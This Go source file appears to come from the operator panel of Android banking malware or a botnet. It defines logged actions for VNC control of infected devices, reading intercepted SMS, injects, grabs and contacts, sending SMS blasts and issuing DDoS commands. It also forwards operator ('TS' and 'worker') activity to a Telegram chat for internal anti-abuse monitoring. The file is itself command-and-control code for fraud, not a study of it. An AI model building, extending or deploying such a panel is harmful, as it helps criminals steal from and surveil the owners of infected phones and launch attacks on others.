package api

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	"redwing/internal/auth"
	"redwing/internal/db"
)

const (
	ActionVNCStart     = "vnc_start"
	ActionVNCStop      = "vnc_stop"
	ActionSendSMS      = "send_sms"
	ActionSendCommand  = "send_command"
	ActionViewSMS      = "view_sms"
	ActionViewInjects  = "view_injects"
	ActionViewPush     = "view_push"
	ActionViewGrabs    = "view_grabs"
	ActionViewApps     = "view_apps"
	ActionEditLabel    = "edit_label"
	ActionDeleteDevice = "delete_device"
	ActionBlast        = "blast"
	ActionDDoS         = "ddos"
	ActionLogin        = "login"
	ActionViewContacts = "view_contacts"
	ActionWSCommand    = "ws_command"
)

var actionLabelsRU = map[string]string{
	ActionVNCStart:     "🖥 VNC подключение",
	ActionVNCStop:      "🖥 VNC отключение",
	ActionSendSMS:      "📤 Отправка SMS",
	ActionSendCommand:  "⚡ Команда устройству",
	ActionViewSMS:      "👁 Просмотр SMS",
	ActionViewInjects:  "👁 Просмотр инжектов",
	ActionViewPush:     "👁 Просмотр push",
	ActionViewGrabs:    "👁 Просмотр грабов",
	ActionViewApps:     "👁 Просмотр приложений",
	ActionEditLabel:    "✏️ Изменение метки",
	ActionDeleteDevice: "🗑 Удаление устройства",
	ActionBlast:        "💣 SMS рассылка",
	ActionDDoS:         "💥 DDoS команда",
	ActionLogin:        "🔑 Вход в панель",
	ActionViewContacts: "👁 Просмотр контактов",
	ActionWSCommand:    "⚡ WS команда",
}

var actionLabelsEN = map[string]string{
	ActionVNCStart:     "🖥 VNC connected",
	ActionVNCStop:      "🖥 VNC disconnected",
	ActionSendSMS:      "📤 SMS sent",
	ActionSendCommand:  "⚡ Command to device",
	ActionViewSMS:      "👁 Viewed SMS",
	ActionViewInjects:  "👁 Viewed injects",
	ActionViewPush:     "👁 Viewed push",
	ActionViewGrabs:    "👁 Viewed grabs",
	ActionViewApps:     "👁 Viewed apps",
	ActionEditLabel:    "✏️ Label edited",
	ActionDeleteDevice: "🗑 Device deleted",
	ActionBlast:        "💣 SMS blast",
	ActionDDoS:         "💥 DDoS command",
	ActionLogin:        "🔑 Panel login",
	ActionViewContacts: "👁 Viewed contacts",
	ActionWSCommand:    "⚡ WS command",
}

func getActionLabel(teamID, action string) string {
	lang := GetSetting(teamID, "tg_notify_lang")
	if lang == "en" {
		if l, ok := actionLabelsEN[action]; ok {
			return l
		}
	}
	if l, ok := actionLabelsRU[action]; ok {
		return l
	}
	return action
}

func LogAction(teamID, login, role, action, deviceID, details, ip string) {
	db.DB.Exec(
		"INSERT INTO action_logs (team_id, login, role, action, device_id, details, ip) VALUES (?, ?, ?, ?, ?, ?, ?)",
		teamID, login, role, action, deviceID, details, ip,
	)

	enabled := GetSetting(teamID, "antichernukha_enabled")
	if enabled != "1" && enabled != "true" {
		return
	}

	token := GetSetting(teamID, "tg_notify_bot_token")
	chatID := GetSetting(teamID, "antichernukha_chat_id")
	if chatID == "" {
		chatID = GetSetting(teamID, "tg_notify_connect_chat_id")
	}
	if token == "" || chatID == "" {
		return
	}

	label := getActionLabel(teamID, action)

	lang := GetSetting(teamID, "tg_notify_lang")
	acTitle := "🛡 Античернуха"
	roleLabel := "ТС"
	workerLabel := "Вбивер"
	if lang == "en" {
		acTitle = "🛡 Anti-abuse"
		roleLabel = "TS"
		workerLabel = "Worker"
	}
	if role == "worker" {
		roleLabel = workerLabel
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%s\n\n%s\n\n", acTitle, label))
	sb.WriteString(fmt.Sprintf("👤 %s (%s)\n", login, roleLabel))
	if deviceID != "" {
		sb.WriteString(fmt.Sprintf("📱 Device: %s\n", deviceID))
	}
	if details != "" {
		sb.WriteString(fmt.Sprintf("\n📝 %s\n", details))
	}
	sb.WriteString(fmt.Sprintf("\n🕐 %s", time.Now().Format("02.01.2006 15:04:05")))
	if ip != "" {
		sb.WriteString(fmt.Sprintf("\n🌐 IP: %s", ip))
	}

	go func() {
		if err := sendTelegram(token, chatID, sb.String()); err != nil {
			log.Printf("[ANTICHERNUKHA] send failed: %v", err)
		}
	}()
}

func LogActionFromRequest(r *http.Request, action, deviceID, details string) {
	session, err := auth.GetSessionFromRequest(r)
	if err != nil {
		return
	}
	ip := r.RemoteAddr
	if fwd := r.Header.Get("X-Forwarded-For"); fwd != "" {
		ip = strings.Split(fwd, ",")[0]
	}
	LogAction(session.TeamID, session.Login, session.Role, action, deviceID, details, ip)
}

func HandleActionLogs(w http.ResponseWriter, r *http.Request) {
	session, err := auth.GetSessionFromRequest(r)
	if err != nil {
		writeJSON(w, map[string]any{"error": "unauthorized"})
		return
	}
	if session.Role != "ts" {
		writeJSON(w, map[string]any{"error": "access denied"})
		return
	}

	teamID := SessionTeamID(r)

	limitStr := r.URL.Query().Get("limit")
	limit := 200
	if limitStr != "" {
		fmt.Sscanf(limitStr, "%d", &limit)
		if limit > 1000 {
			limit = 1000
		}
	}

	filterLogin := r.URL.Query().Get("login")
	filterAction := r.URL.Query().Get("action")

	query := "SELECT id, login, role, action, device_id, details, ip, created_at FROM action_logs WHERE team_id = ?"
	args := []any{teamID}

	if filterLogin != "" {
		query += " AND login = ?"
		args = append(args, filterLogin)
	}
	if filterAction != "" {
		query += " AND action = ?"
		args = append(args, filterAction)
	}

	query += " ORDER BY created_at DESC LIMIT ?"
	args = append(args, limit)

	rows, err := db.DB.Query(query, args...)
	if err != nil {
		writeJSON(w, map[string]any{"logs": []any{}})
		return
	}
	defer rows.Close()

	var logs []map[string]any
	for rows.Next() {
		var id int
		var login, role, action, deviceID, details, ip, created string
		rows.Scan(&id, &login, &role, &action, &deviceID, &details, &ip, &created)
		logs = append(logs, map[string]any{
			"id":         id,
			"login":      login,
			"role":       role,
			"action":     action,
			"label":      actionLabelsRU[action],
			"device_id":  deviceID,
			"details":    details,
			"ip":         ip,
			"created_at": created,
		})
	}
	if logs == nil {
		logs = []map[string]any{}
	}
	writeJSON(w, map[string]any{"logs": logs})
}

func HandleAntiChernukhaSettings(w http.ResponseWriter, r *http.Request) {
	session, err := auth.GetSessionFromRequest(r)
	if err != nil {
		writeJSON(w, map[string]any{"error": "unauthorized"})
		return
	}
	if session.Role != "ts" {
		writeJSON(w, map[string]any{"error": "access denied"})
		return
	}

	teamID := SessionTeamID(r)

	switch r.Method {
	case http.MethodGet:
		writeJSON(w, map[string]any{
			"enabled": GetSetting(teamID, "antichernukha_enabled"),
			"chat_id": GetSetting(teamID, "antichernukha_chat_id"),
		})
	case http.MethodPost:
		var body map[string]any
		if json.NewDecoder(r.Body).Decode(&body) != nil {
			writeJSON(w, map[string]any{"error": "invalid json"})
			return
		}
		if v, ok := body["enabled"]; ok {
			val := fmt.Sprintf("%v", v)
			db.DB.Exec("INSERT INTO team_settings (team_id, key, value) VALUES (?, 'antichernukha_enabled', ?) ON CONFLICT(team_id, key) DO UPDATE SET value = ?",
				teamID, val, val)
		}
		if v, ok := body["chat_id"]; ok {
			val := fmt.Sprintf("%v", v)
			db.DB.Exec("INSERT INTO team_settings (team_id, key, value) VALUES (?, 'antichernukha_chat_id', ?) ON CONFLICT(team_id, key) DO UPDATE SET value = ?",
				teamID, val, val)
		}
		writeJSON(w, map[string]any{"success": true})
	}
}
